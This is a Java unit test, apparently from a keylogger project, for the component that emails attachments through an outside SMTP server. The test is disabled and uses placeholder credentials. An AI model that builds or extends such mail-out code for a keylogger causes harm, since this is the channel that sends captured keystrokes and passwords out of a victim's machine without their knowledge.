package com.mossad.keylogger.mail;

import org.apache.commons.mail.EmailException;
import org.junit.jupiter.api.Disabled;
import org.junit.jupiter.api.Test;

import java.util.Collections;

public class MailSenderTest {

      @Disabled
      @Test
      public void sendEmail() throws EmailException {
            MailSender mailSender = new MailSender(
                    "smtp.wp.pl",
                    "someEmail",
                    "somePassword", MailSender.SMTP_PORT);
            mailSender.prepareEmailWithAttqchment(Collections.emptyList());
            mailSender.send();
      }
}